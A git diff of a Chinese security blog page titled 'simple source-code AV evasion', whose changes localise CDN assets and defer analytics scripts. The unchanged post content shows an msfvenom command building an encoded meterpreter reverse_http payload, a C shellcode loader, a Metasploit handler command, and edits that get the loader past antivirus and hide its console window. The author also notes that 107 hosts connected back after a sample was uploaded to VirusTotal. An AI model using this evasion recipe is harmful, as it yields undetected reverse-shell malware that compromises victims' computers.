@@ -15,7 +15,11 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4"></script>
+<!--
+  gtag.js 从 googletagmanager.com 加载，该域名在中国大陆不可达；原来用 async 会一直挂住 window.load
+  （表现：页面一直转圈、Network 里那条请求长期 pending）。改为「等 load 之后再动态插入」。
+  上报不受影响，只是晚一点点；页面加载则完全不受第三方影响。
+-->
 <script>
     window.dataLayer = window.dataLayer || [];
     function gtag() {
@@ -24,27 +28,37 @@
 
     gtag('js', new Date());
     gtag('config', 'G-KYC8PY5RS4');
+    (function () {
+        function start() {
+            var s = document.createElement('script');
+            s.async = true;
+            s.src = 'https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4';
+            document.head.appendChild(s);
+        }
+        if (document.readyState === 'complete') { start(); }
+        else { window.addEventListener('load', start); }
+    })();
 </script>
 
 
     <title>简单的源码免杀 | Yang Hao&#39;s blog</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
 	
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
 	
 	<!--prism-->
-	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>
+	<link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
+    <script src="/libs/prism/prism.js" async ></script>
 
 
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script>
 	<script src="/live2d-widget/autoload.js"></script>
 <meta name="generator" content="Hexo 5.4.2">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
@@ -59,7 +73,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Yang Hao&#39;s blog</span>
                 </a>
@@ -157,7 +171,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
         <div class="logo-name">Yang Hao&#39;s blog</div>
         <div class="logo-desc">
@@ -265,7 +279,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -283,7 +297,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
 <style>
     #articleContent h1::before,
     #articleContent h2::before,
@@ -457,11 +471,11 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。</p>
-<h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2 shellcode生成和二进制文件编译"></a>2 shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
+<h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2 shellcode生成和二进制文件编译"></a>2 shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="/images/loli/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="/images/loli/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="/images/loli/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
 <p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p>
 <pre><code class="line-numbers language-c">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=192.168.8.102 LPORT=6666 -f c
 </code></pre>
-<p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p>
+<p><img src="/images/loli/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p>
 <pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
 #include&lt;windows.h&gt;
 #pragma comment(linker, "/OPT:nowin98")
@@ -480,13 +494,13 @@ int main(int argc,char const *argv[])
 <p>话不多说，先编译上线测试，启动msf监听：</p>
 <pre><code class="line-numbers language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666
 </code></pre>
-<p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p>
-<h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3 VS免杀测试"></a>3 VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
-<p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p>
-<p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p>
+<p> <img src="/images/loli/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="/images/loli/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="/images/loli/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="/images/loli/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p>
+<h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3 VS免杀测试"></a>3 VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="/images/loli/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
+<p><img src="/images/loli/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p>
+<p><img src="/images/loli/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="/images/loli/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p>
 <pre><code class="line-numbers language-c">#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 
 </code></pre>
-<p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p>
+<p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="/images/loli/2020/08/30/lDvSHZB6jrOtFcU.png"></p>
 <p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p>
 <pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
 #include&lt;windows.h&gt;
@@ -500,11 +514,11 @@ unsigned char buf[] ="shellcode";
  return 0;
 }
 </code></pre>
-<p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p>
-<p>这里我们使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p>
+<p>那么编译执行后会有个DOS窗口：<br><img src="/images/loli/2020/08/30/LVk8Qa3oDpbilH9.png"></p>
+<p>这里我们使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="/images/loli/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="/images/loli/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p>
 <pre><code class="line-numbers language-c">ShowWindow(GetConsoleWindow(), SW_HIDE);
 </code></pre>
-<p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p>
+<p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="/images/loli/2020/08/30/sQ1j6vhLouC5dOb.png"></p>
 <h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h4><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
 
             </div>
@@ -585,12 +599,12 @@ unsigned char buf[] ="shellcode";
                     
                 </div>
                 <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/css/share.min.css">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
     <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/js/social-share.min.js"></script>
+    <script src="/libs/share/js/social-share.min.js"></script>
     
 
     
@@ -857,8 +871,8 @@ unsigned char buf[] ="shellcode";
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/av-min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/Valine.min.js"></script>
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#vcomments',
@@ -890,7 +904,7 @@ unsigned char buf[] ="shellcode";
                 <a href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="记一次简单的win提权">
+                        <img src="/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="记一次简单的win提权">
                         
                         <span class="card-title">记一次简单的win提权</span>
                     </div>
@@ -942,7 +956,7 @@ unsigned char buf[] ="shellcode";
                 <a href="/2020/08/22/weblogic-iiop-fan-xu-lie-hua-lou-dong-cve-2020-2551-fu-xian/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="Weblogic IIOP反序列化漏洞CVE-2020-2551复现">
+                        <img src="/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="Weblogic IIOP反序列化漏洞CVE-2020-2551复现">
                         
                         <span class="card-title">Weblogic IIOP反序列化漏洞CVE-2020-2551复现</span>
                     </div>
@@ -1030,21 +1044,21 @@ unsigned char buf[] ="shellcode";
 
 
 <!-- 代码块功能依赖 -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeLang.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeShrink.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
 <!-- 代码块折行 -->
@@ -1068,7 +1082,7 @@ unsigned char buf[] ="shellcode";
 </div>
 
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.min.js"></script>
+<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
     $(function () {
         tocbot.init({
@@ -1300,10 +1314,10 @@ $(document).ready(function() {
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/search.js"></script>
+<script src="/js/search.js"></script>
 <script type="text/javascript">
 $(function () {
-    searchFunc("https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/search.xml", 'searchInput', 'searchResult');
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
 });
 </script>
 
@@ -1315,12 +1329,12 @@ $(function () {
 </div>
 
 	
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/matery.js"></script>
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
 
 
     <!-- Baidu Analytics -->
@@ -1330,14 +1344,13 @@ $(function () {
     
     
     <!--
-      不蒜子计数：原写法是 <script async src="...">。async 脚本同样会挂住 window.load，
-      一旦 busuanzi.ibruce.info 卡住，页面就一直转圈、Network 里那条请求长期 pending。
-      改成：先隐藏计数 → 等 load 之后再动态插入脚本 → 成功才由脚本自己显示出来。
-      这样页面加载完全不受第三方接口影响；接口不通时保持隐藏，不会留一个空标签。
+      访问计数：脚本等 window.load 之后再动态插入，任何第三方接口卡住都不影响页面加载。
+      后端见 source/js/counter.js —— 自建 Cloudflare Worker 优先，未配置/失败时回退 Vercount。
+      计数容器默认隐藏，拿到数字才显示，避免留一个「总访问量: 」空标签。
     -->
     <script>
         (function () {
-            var src = 'https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/others/busuanzi.pure.mini.js';
+            var src = '/js/counter.js';
             var keys = ['site_pv', 'page_pv', 'site_uv'];
             keys.forEach(function (k) {
                 var el = document.getElementById('busuanzi_container_' + k);
@@ -1366,7 +1379,7 @@ $(function () {
     
 
     
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
 </body>
